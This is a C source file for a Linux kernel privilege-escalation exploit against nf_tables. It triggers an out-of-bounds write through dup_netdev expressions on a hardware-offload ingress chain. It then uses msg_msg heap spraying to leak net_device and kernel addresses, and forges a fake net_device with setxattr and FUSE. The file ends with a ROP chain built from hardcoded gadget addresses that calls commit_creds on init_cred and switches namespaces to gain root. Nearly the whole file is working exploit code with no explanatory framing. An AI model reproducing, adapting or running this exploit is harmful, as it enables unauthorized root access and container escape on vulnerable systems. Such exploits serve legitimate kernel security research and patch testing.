#define _GNU_SOURCE 1
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>

#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/xattr.h>
#include <sys/ioctl.h>

#include <net/if.h>
#include <linux/sockios.h>
#include <linux/ethtool.h>

#include "common.h"
#include "nf_tables.h"
#include "log.h"
#include "fuse.h"
#include "msg_msg.h"

#define MTYPE_A (0x41)
#define MTYPE_B (0x42)
#define MSG_A_TEXT_SIZE MSG_TEXT_SIZE(0x1080)
#define MSG_B_TEXT_SIZE MSG_TEXT_SIZE(192)
#define HOLE_STEP (0x20)

#define NUM_SETXATTR (0x100)

#define BUF_PAGE_ADDR ((void *)0x1337000)
#define FUSE_PAGE_ADDR ((void *)0x1338000)
#define XATTR_BUF_ADDR (BUF_PAGE_ADDR + 0x16)

#define LOOPBACK_OPS_ADDR (0xffffffff82308820)
#define KERNEL_BASE (0xffffffff81000000)

#define INIT_CRED 0xffffffff8286d440
#define INIT_NSPROXY 0xffffffff8286d200
#define BPF_GET_CURRENT_TASK 0xffffffff811dea10
#define COMMIT_CREDS 0xffffffff810ce6f0
#define SWITCH_TASK_NAMESPACES 0xffffffff810ccb90
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81e00ff0 // +22
#define PUSH_RDI_POP_RSP_POP_RBP 0xffffffff816fbe65
#define MOV_RDI_RAX_POP_4_VALS_RET 0xffffffff815eb254
#define POP_RSI_POP_RBP_RET 0xffffffff814bdbd0
#define POP_RDI_RET 0xffffffff8108f8c0
#define RET 0xffffffff814bdbd5

int sig_pipe[2];
char buf[0x4000];
struct typ_msg *msgp = (struct typ_msg *)buf;
uint64_t child_net_device_addr, parent_net_device_addr;
uint64_t kernel_base, kernel_offset;

void trigger_vuln(int pad_num, int oobw_num) {
    char buf[MNL_SOCKET_BUFFER_SIZE];
    struct nlmsghdr *nlh;
    struct mnl_socket *nl;
    struct mnl_nlmsg_batch *batch;
    int seq;

    nl = mnl_socket_open(NETLINK_NETFILTER);
    if (nl == NULL)
        die("mnl_socket_open");
    
    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
        die("mnl_socket_bind");
    
    seq = time(NULL);

    // create table
    struct nftnl_table *table = nftnl_table_alloc();
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, "table");

    // create chain
    struct nftnl_chain *chain = nftnl_chain_alloc();
    nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, "table");
    nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, "chain");
    nftnl_chain_set_u32(chain, NFTNL_CHAIN_HOOKNUM, NF_NETDEV_INGRESS);
    nftnl_chain_set_u32(chain, NFTNL_CHAIN_PRIO, 10); 
    nftnl_chain_set_u32(chain, NFTNL_CHAIN_FLAGS, NFT_CHAIN_HW_OFFLOAD);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_DEV, "lo");

    // create rule
    struct nftnl_rule *rule = nftnl_rule_alloc();
    nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, "table");
    nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, "chain");

    // create exprs
    for (int i = 0; i < pad_num; i++) {
        rule_add_immediate(rule, NFT_REG_1);
        rule_add_dup_netdev(rule, NFT_REG_1);
    }

    for (int i = 0; i < oobw_num; i++) 
        rule_add_dup_netdev(rule, NFT_REG_1);

    // send batch
    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                     NFT_MSG_NEWTABLE, NFPROTO_NETDEV,
                                     0, seq++);
    nftnl_table_nlmsg_build_payload(nlh, table);
    nftnl_table_free(table);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                     NFT_MSG_NEWCHAIN, NFPROTO_NETDEV,
                                     NLM_F_CREATE, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, chain);
    nftnl_chain_free(chain);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                     NFT_MSG_NEWRULE, NFPROTO_NETDEV,
                                     NLM_F_CREATE, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rule);
    nftnl_rule_free(rule);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                        mnl_nlmsg_batch_size(batch)) < 0)
        die("mnl_socket_sendto");

    mnl_nlmsg_batch_stop(batch);
}

int do_leak_net_device_addr(void *arg) {
    uint64_t *leak = (uint64_t *)arg;

retry_leak_netdevice_addr:
    memset(buf, 0, sizeof(buf));

    logd("spray msg_msg ...");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        msgp->mtype = MTYPE_A;
        if (msgsnd(msqid[i], (void *)msgp, MSG_A_TEXT_SIZE, 0) < 0) {
            die("msgsnd");
        }
    }

    logd("create holes, step: %d", HOLE_STEP);
    for (int i = 0; i < NUM_MSQIDS; i += HOLE_STEP) {
        if (msgrcv(msqid[i], (void *)msgp, MSG_A_TEXT_SIZE,
            0, IPC_NOWAIT | MSG_NOERROR) < 0) {
            die("msgrcv");
        }
    }

    logi("trigger vulnerability to oob write net_device's addr to msg_msgseg...");
    trigger_vuln(1, 1);

    logi("leak net_device addr...");
    uint64_t *leak_pos = (uint64_t *)(msgp->mtext + PAGE_SIZE
                         - sizeof(struct msg_msg));
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if (i % HOLE_STEP == 0) continue;
        if (msgrcv(msqid[i], (void *)msgp, MSG_A_TEXT_SIZE,
            0, IPC_NOWAIT | MSG_NOERROR) < 0) {
            die("msgrcv");
        }

        if (*leak_pos) {
            *leak = *leak_pos;
            break;
        }
    }

    clear_msq(msgp, MSG_A_TEXT_SIZE, MTYPE_A);

    if (*leak == 0) {
        logw("leak net_device addr failed, retry...");
        goto retry_leak_netdevice_addr;
    }

    if (leak == (uint64_t *)&child_net_device_addr) {
        write(sig_pipe[1], "1", 1);
        sleep(10000);
    }

    return 0;
}

void do_leak_child_net_device_addr() {
    char signal;
    void *stack = mmap((void *)NULL, 0x10000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    int ret = clone(do_leak_net_device_addr, stack + 0x10000, CLONE_NEWNS | CLONE_NEWNET | CLONE_VM, (void *)&child_net_device_addr);
    if (ret < 0)
        die("clone");
    read(sig_pipe[0], &signal, 1);
}

void *setxattr_handler(void *arg) {
    setxattr("/tmp/foo.txt", "user.spray", XATTR_BUF_ADDR, PAGE_SIZE, XATTR_CREATE);
}

void build_fake_net_device_for_leak() {
    char *fake_net_device = (char *)XATTR_BUF_ADDR;
    strcpy(&fake_net_device[0], "lo");                                   // fake_net_device->name = "lo"
    *(uint8_t *)&fake_net_device[0x265] = 8;                             // fake_net_device->addr_len = 8
    *(uint64_t *)&fake_net_device[0x330] = child_net_device_addr + 0xc8; // fake_net_device->dev_addr = child_net_device_addr->netdev_ops
    *(int *)&fake_net_device[0xd0] = 0x0badc0de;                         // fake_net_device->ifindex = 0x0badc0de
}

void build_fake_net_device_for_rop() {
    char *fake_net_device = (char *)XATTR_BUF_ADDR;
    strcpy(fake_net_device, "lo"); // fake_net_device->name = "lo"

    uint64_t *rop = (uint64_t *)fake_net_device;
    int i = 1;
    rop[i++] = RET + kernel_offset;
    rop[i++] = BPF_GET_CURRENT_TASK + kernel_offset;
    rop[i++] = MOV_RDI_RAX_POP_4_VALS_RET + kernel_offset;
    rop[i++] = 0xdeadbeef;
    rop[i++] = 0xdeadbeef;
    rop[i++] = 0xdeadbeef;
    rop[i++] = 0xdeadbeef;
    rop[i++] = POP_RSI_POP_RBP_RET + kernel_offset;
    rop[i++] = INIT_NSPROXY + kernel_offset;
    rop[i++] = 0xdeadbeef;
    rop[i++] = SWITCH_TASK_NAMESPACES + kernel_offset;
    rop[i++] = POP_RDI_RET + kernel_offset;
    rop[i++] = INIT_CRED + kernel_offset;
    rop[i++] = COMMIT_CREDS + kernel_offset;
    rop[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22 + kernel_offset;
    rop[i++] = 0xdeadbeef;
    rop[i++] = 0xdeadbeef;
    rop[i++] = (uint64_t)get_root;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    *(uint64_t *)&fake_net_device[0x38] |= 2;                                        // fake_net_device->state |= 1 << __LINK_STATE_PRESENT
    *(uint64_t *)&fake_net_device[0x210] = parent_net_device_addr + 0x218 - 0xc8;    // fake_net_device->ethtool_ops
    *(uint64_t *)&fake_net_device[0x218] = PUSH_RDI_POP_RSP_POP_RBP + kernel_offset; // fake_net_device->ethtool_ops->begin()
    *(int *)&fake_net_device[0xd0] = 0x0badc0de;                                     // fake_net_device->ifindex = 0x0badc0de
}

void forge_fake_net_device() {
    system("touch /tmp/foo.txt");
    fuse_fd = open("/tmp/foo/slavin", O_RDWR);
    if (fuse_fd < 0) {
        die("open file: /tmp/foo/slavin");
    }
    
    if (mmap(FUSE_PAGE_ADDR, PAGE_SIZE, PROT_READ | PROT_WRITE,
        MAP_SHARED | MAP_FIXED, fuse_fd, 0) != FUSE_PAGE_ADDR) {
            die("mmap fuse page");
    }

    if (mmap(BUF_PAGE_ADDR, PAGE_SIZE, PROT_READ | PROT_WRITE,
        MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0) != BUF_PAGE_ADDR) {
            die("mmap buf page");
    }

    memset(BUF_PAGE_ADDR, 0, PAGE_SIZE);

    if (!kernel_base)
        build_fake_net_device_for_leak();
    else
        build_fake_net_device_for_rop();

    pthread_t threads[NUM_SETXATTR];
    for (int i = 0; i < NUM_SETXATTR; i++) {
        if (pthread_create(&threads[i], NULL, setxattr_handler, NULL) != 0) {
            die("pthread_create");
        }
    }

    sleep(1);
}

void do_leak_kernel_base() {
    uint64_t leak_loopback_ops_addr = 0;

retry_free_net_device:
    memset(buf, 0, sizeof(buf));

    logd("spray msg_msg ...");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        msgp->mtype = MTYPE_B;
        if (msgsnd(msqid[i], (void *)msgp, MSG_B_TEXT_SIZE, 0) < 0) {
            die("msgsnd");
        }
    }

    logd("create holes, step: %d", HOLE_STEP);
    for (int i = 0; i < NUM_MSQIDS; i += HOLE_STEP) {
        if (msgrcv(msqid[i], (void *)msgp, MSG_B_TEXT_SIZE,
            0, IPC_NOWAIT | MSG_NOERROR) < 0) {
            die("msgrcv");
        }
    }

    logi("trigger vulnerability to oob write net_device's addr to msg_msg->security...");
    trigger_vuln(2, 6);

    logi("free net_device...");
    int success = 0;
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if (i % HOLE_STEP == 0) continue;

        if (msgrcv(msqid[i], (void *)msgp, MSG_B_TEXT_SIZE, 0,
            IPC_NOWAIT | MSG_NOERROR) < 0) {
            die("msgrcv");
        }

        if (msgp->mtype == NFPROTO_NETDEV) {
            logs("success to free net_device...");
            success = 1;
            break;
        }
    }

    if (!success) {
        logw("free net_device failed, retry...");
        clear_msq(msgp, MSG_B_TEXT_SIZE, MTYPE_B);
        goto retry_free_net_device;
    }

    logi("setxattr+FUSE to spray fake net_device...");
    forge_fake_net_device();

    logi("leak kernel base...");
    struct ifreq req;
    strcpy(req.ifr_name, "lo");

    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (fd < 0) {
        die("socket");
    }

    if (ioctl(fd, SIOCGIFHWADDR, &req) != 0) {
        die("ioctl");
    }

    leak_loopback_ops_addr = *(uint64_t *)&req.ifr_addr.sa_data[0];
    if (leak_loopback_ops_addr < 0xffffffff81000000) {
        die("leak kernel base failed");
    }
    logs("leak loopback_ops_addr addr: 0x%lx", leak_loopback_ops_addr);

    kernel_offset = leak_loopback_ops_addr - LOOPBACK_OPS_ADDR;
    logs("leak kernel offset: 0x%lx", kernel_offset);
    kernel_base = kernel_offset + KERNEL_BASE;
    logs("leak kernel base: 0x%lx", kernel_base);

    close(fd);
}

void do_rop() {
    //clean
    write(sig_pipe[1], "1", 1);
    munmap(BUF_PAGE_ADDR, PAGE_SIZE);
    munmap(FUSE_PAGE_ADDR, PAGE_SIZE);
    close(fuse_fd);

    logi("setxattr+FUSE to spray fake net_device...");
    forge_fake_net_device();

    struct ifreq req;
    uint32_t ethcmd = ETHTOOL_GSET;

    strcpy(req.ifr_name, "lo");
    req.ifr_data = (char *)&ethcmd;

    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (!fd) {
        die("socket");
    }
    
    logi("trigger rop...");
    if (ioctl(fd, SIOCETHTOOL, &req) != 0) {
        die("ioctl");
    }

    close(fd);
}

int main(int argc, char *argv[]) {

    if (geteuid() != 0) {
        logs("Step 0: Initialize");
        logd("Unshared namespaces");
        char *args[] = {"unshare", "-Urnm", argv[0], NULL, };
        execvp("unshare", args);
        die("unshare");
    }
    
    bind_core(0);
    save_status();
    pipe(sig_pipe);
    init_msq();

    mkdir(MNT_PATH, 0777);
    fuse_argv[0] = argv[0];
    if (!fork()) {
        fuse_main(fuse_argc, fuse_argv, &fuse_ops, NULL);
        loge("FUSE shouldn't reach here");
        sleep(100000);
    }
    sleep(1);

    logs("Step 1: Leak net_device addr");
    do_leak_child_net_device_addr();
    logs("child net_device addr: 0x%lx", child_net_device_addr);
    do_leak_net_device_addr((void *)&parent_net_device_addr);
    logs("parent net_device addr: 0x%lx", parent_net_device_addr);

    logs("Step 2: Leak kernel_base");
    do_leak_kernel_base();

    logs("Step 3: ROP");
    do_rop();

    return 0;
}
